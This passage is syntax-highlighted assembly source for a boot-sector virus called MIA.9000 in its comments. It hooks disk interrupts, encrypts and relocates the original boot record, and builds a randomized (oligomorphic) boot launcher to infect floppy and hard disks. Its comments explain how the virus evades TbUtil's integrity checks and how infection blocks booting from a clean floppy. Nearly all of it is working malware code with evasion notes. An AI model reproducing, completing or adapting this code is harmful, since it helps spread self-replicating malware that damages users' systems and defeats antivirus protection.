 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">jcxz</span><span class="sc0">   </span><span class="sc5">Troublesome</span><span class="sc0">            </span><span class="sc1">; Error, too few reserved sectors</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc2">0000h</span><span class="sc0">                  </span><span class="sc1">; Push zero word</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                     </span><span class="sc1">; CL = highest sector number minus 18</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                 </span><span class="sc1">; CMOS RAM index 10h = floppy drive type</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Spot</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">; Save it for later usage</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">04CCh</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Award BIOS configuration bits,</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc0">                     </span><span class="sc1">; including floppy drives swapping</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Forfeit</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">Ripedisk</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">                 </span><span class="sc1">; Obtain random word</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Polynomial</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">     </span><span class="sc1">; Save the hi-byte</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Disable_Equipments</span><span class="sc0">     </span><span class="sc1">; Disable keyboard, mouse, RTC, video (so MIA's</span><span class="sc0">
                               </span><span class="sc1">; INT 09h handler will not be executed during</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0300h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Loader</span><span class="sc0">      </span><span class="sc1">; encryption that can cause a system crash).</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Value_1</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0"> 
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Value_2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                     </span><span class="sc1">; Reserve a sector for saving original boot-record</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Backbreak</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Junkie</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Junkie</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffy</span><span class="sc0">
 </span><span class="sc6">repe</span><span class="sc0">   </span><span class="sc6">movsw</span><span class="sc0">                  </span><span class="sc1">; Copy boot decryptor to CS:0003h</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                  </span><span class="sc1">; FD or HD ?</span><span class="sc0">
 </span><span class="sc6">les</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ROM_BIOS</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Load original INT 13h vector</span><span class="sc0">
 </span><span class="sc6">js</span><span class="sc0">     </span><span class="sc5">Trueblue</span><span class="sc0">
 </span><span class="sc6">les</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Flop_BIOS</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Load original INT 40h vector</span><span class="sc0">

</span><span class="sc5">Trueblue</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1Dh</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; Fixed address!!</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0E8h</span><span class="sc0">                   </span><span class="sc1">; Encrypt and write to disk</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffy</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Evoke</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Junkie</span><span class="sc4">))</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Restore_IRQs</span><span class="sc0">           </span><span class="sc1">; Restore PIC 1 state</span><span class="sc0">

</span><span class="sc5">Stupid</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">Troublesome</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                     </span><span class="sc1">; Save original boot-record in previous sector</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Cipher</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; Get encryption keyword...</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Slack</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">ExOr_Boot</span><span class="sc0">              </span><span class="sc1">; Encrypt original boot-record</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0">               </span><span class="sc1">; Write original boot-record</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">18h</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">Stupid</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Cipher</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">ExOr_Boot</span><span class="sc0">              </span><span class="sc1">; Decrypt original boot-record</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ Generate (oligomorphic) boot-launcher ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">

</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc1">; Example:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     0000:7C00  E9 44 01           JMP     7D47</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     0000:7D47  FA                 CLI</span><span class="sc0">
</span><span class="sc1">;     0000:7D48  2B E4              SUB     SP,SP</span><span class="sc0">
</span><span class="sc1">;     0000:7D4A  8E C4              MOV     ES,SP ƒƒƒ Set read buffer segment</span><span class="sc0">
</span><span class="sc1">;     0000:7D4C  8E D4              MOV     SS,SP ƒƒƒ Set stack segment</span><span class="sc0">
</span><span class="sc1">;     0000:7D4E  B9 53 50           MOV     CX,5053 ƒƒƒ Track 80, sector 83</span><span class="sc0">
</span><span class="sc1">;     0000:7D51  BC 9A E4           MOV     SP,E49A ƒƒƒ Set stack pointer</span><span class="sc0">
</span><span class="sc1">;     0000:7D54  BA 00 01           MOV     DX,0100 ƒƒƒ Side 1, drive A</span><span class="sc0">
</span><span class="sc1">;     0000:7D57  B8 11 02           MOV     AX,0211 ƒƒƒ Read 17 sectors</span><span class="sc0">
</span><span class="sc1">;     0000:7D5A  BB 71 1A           MOV     BX,1A7D ƒƒƒ Read buffer offset</span><span class="sc0">
</span><span class="sc1">;     0000:7D5D  CD 13              INT     13</span><span class="sc0">
</span><span class="sc1">;     0000:7D5F  72 02              JC      7D63</span><span class="sc0">
</span><span class="sc1">;     0000:7D61  FF E3              JMP     BX</span><span class="sc0">
</span><span class="sc1">;     0000:7D63  CD 18              INT     18</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹</span><span class="sc0">


 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc2">1983h</span><span class="sc0">

</span><span class="sc5">Cipher</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">    </span><span class="sc1">; Original boot-record's encryption keyword</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">22h</span><span class="sc4">],</span><span class="sc2">5053h</span><span class="sc0">

</span><span class="sc5">Value_1</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">   </span><span class="sc1">; Sector &amp; track (cylinder) ...</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">               </span><span class="sc1">; Boot drive &amp; head (side) of original </span><span class="sc0">
                               </span><span class="sc1">; boot-record and virus codes</span><span class="sc0">
</span><span class="sc5">Value_2</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">

 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                 </span><span class="sc1">; Drive B ain't bootable, of course</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">27h</span><span class="sc4">],</span><span class="sc2">0FEEDh</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">29h</span><span class="sc4">],</span><span class="sc2">0BABEh</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc4">],</span><span class="sc2">10CDh</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3Bh</span><span class="sc4">],</span><span class="sc2">0001h</span><span class="sc0">

</span><span class="sc5">Value_3</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">   </span><span class="sc1">; Sector &amp; track (cylinder) of boot-record </span><span class="sc0">
                               </span><span class="sc1">; (needed for HD)</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3Dh</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">Value_4</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">   </span><span class="sc1">; Head (side) of boot-record (needed for HD)</span><span class="sc0">


</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc1">; When infecting a hard disk, MIA overwrites the first 26 bytes of its active</span><span class="sc0">
</span><span class="sc1">; boot-record  (overwrites first 23 bytes of BPB)  with virus launcher.  This</span><span class="sc0">
</span><span class="sc1">; has two advantages:</span><span class="sc0">
</span><span class="sc1">; 1) When user tries to boot the computer from clean floppy disk, whereas the</span><span class="sc0">
</span><span class="sc1">;    first fixed disk has been infected,  user will not be able to access the</span><span class="sc0">
</span><span class="sc1">;    current active partition of that disk, He/She will only get an error DOS</span><span class="sc0">
</span><span class="sc1">;    message,  "Invalid media type reading drive C".  This forces the user to </span><span class="sc0">
</span><span class="sc1">;    boot from infected partition.</span><span class="sc0">
</span><span class="sc1">; 2) If the MBR of infected hard disk has been immunized by TbUtil,  then the</span><span class="sc0">
</span><span class="sc1">;    TbUtil's  MBR  will not be able to detect changes of MIA-infected active</span><span class="sc0">
</span><span class="sc1">;    boot-record (whereas, in fact MBR is executed before active boot-record)</span><span class="sc0">
</span><span class="sc1">;    since TbUtil's MBR doesn't include the first 64 bytes of the boot-record</span><span class="sc0">
</span><span class="sc1">;    in its CRC calculation (maybe 'cause the BPB is there and it's sometimes</span><span class="sc0">
</span><span class="sc1">;    changed by the user).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; More infos:</span><span class="sc0">
</span><span class="sc1">; TbUtil's MBR has three ways to detect boot-record virus,  one way to detect</span><span class="sc0">
</span><span class="sc1">; viruses  that infect active boot-record of fixed disk and two other ways to</span><span class="sc0">
</span><span class="sc1">; detect MBR-infectors, those ways are described below:</span><span class="sc0">
</span><span class="sc1">; 1) Compare the CRC value of active boot-record made in installation process</span><span class="sc0">
</span><span class="sc1">;    with  the one  calculated on boot-strap,  this is the only way to detect</span><span class="sc0">
</span><span class="sc1">;    viruses that infect  the active boot-record  since the virus has not yet</span><span class="sc0">
</span><span class="sc1">;    been resident. (however, MIA can avoid it)</span><span class="sc0">
</span><span class="sc1">; 2) Compare the amount of base memory (the word at 0040h:0013h) with certain</span><span class="sc0">
</span><span class="sc1">;    value, usually 027Fh (TbUtil v7.x &amp; v8.x).  Many boot-record viruses can</span><span class="sc0">
</span><span class="sc1">;    be detected using this way  (particularly Multi-partite ones),  however,</span><span class="sc0">
</span><span class="sc1">;    I have seen some viruses are tricky enough to avoid this,  for instance,</span><span class="sc0">
</span><span class="sc1">;    the TPVO.3783 just copies its codes to absolute address 7C00h:0000h then</span><span class="sc0">
</span><span class="sc1">;    waits for DOS to be loaded,  then allocates DOS memory and  moves itself</span><span class="sc0">
</span><span class="sc1">;    there, very tricky!!</span><span class="sc0">
</span><span class="sc1">; 3) Checking segment of INT 13h vector in IVT,  TbUtil's MBR checks  whether</span><span class="sc0">
</span><span class="sc1">;    it's above or same with C000h (indicates ROM),  if not then user will be</span><span class="sc0">
</span><span class="sc1">;    alarmed for the presence of a boot-record virus.  Almost all boot-record</span><span class="sc0">
</span><span class="sc1">;    viruses can be detected using this way, but still,  there are some nasty</span><span class="sc0">
</span><span class="sc1">;    ones that can avoid this check,  including TPVO.3783 which uses the same</span><span class="sc0">
</span><span class="sc1">;    method with MIA.9000 to hook INT 13h (I consider this method great code,</span><span class="sc0">
</span><span class="sc1">;    but I wonder why it's seldom used).</span><span class="sc0">
</span><span class="sc1">;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹</span><span class="sc0">


 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                  </span><span class="sc1">; FD or HD ?</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">js</span><span class="sc0">     </span><span class="sc5">Offend</span><span class="sc0">                 </span><span class="sc1">; Branch if HD</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">                
 </span><span class="sc6">stosb</span><span class="sc0">                         </span><span class="sc1">; Put a near JMP opcode</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01A3h</span><span class="sc0">               </span><span class="sc1">; In FD infection, MIA chooses JMP destination</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">                 </span><span class="sc1">; randomly, 8-)</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">003Bh</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">                         </span><span class="sc1">; Put JMP displacement</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; Now DI points out to JMP destination</span><span class="sc0">

</span><span class="sc5">Offend</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">               </span><span class="sc1">; [0..3]</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc0">               
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; BP will be for shuffling loop, [13..16]</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">                 </span><span class="sc1">; Obtain random word into AX</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">33FAh</span><span class="sc0">               </span><span class="sc1">; CLI + XOR XX,XX</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Exclusive</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                 </span><span class="sc1">; SUB XX,XX</span><span class="sc0">

</span><span class="sc5">Exclusive</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0008h</span><span class="sc0">               </span><span class="sc1">; Eight kinda registers</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">                 </span><span class="sc1">; AX/BX/CX/DX/SP/BP/SI/DI</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">imul</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0009h</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0C0D0h</span><span class="sc0">              </span><span class="sc1">; Generate MOV ES,XX/MOV SS,XX</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Eh</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Consistent</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                  </span><span class="sc1">; Exchange ES/SS order</span><span class="sc0">

</span><span class="sc5">Consistent</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">                </span><span class="sc1">; MOV AX,XXXX</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">                         
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Loader</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0BBh</span><span class="sc0">                </span><span class="sc1">; MOV BX,XXXX</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">Randomize</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">                 </span><span class="sc1">; Get random word for read buffer on booting</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0502h</span><span class="sc0">               </span><span class="sc1">; Avoids overwriting IVT, BIOS data area, Print</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Randomize</span><span class="sc0">              </span><span class="sc1">; Screen status byte, and NEC PC-9000 screen mode</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7C00h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Loader</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc4">)</span><span class="sc0">
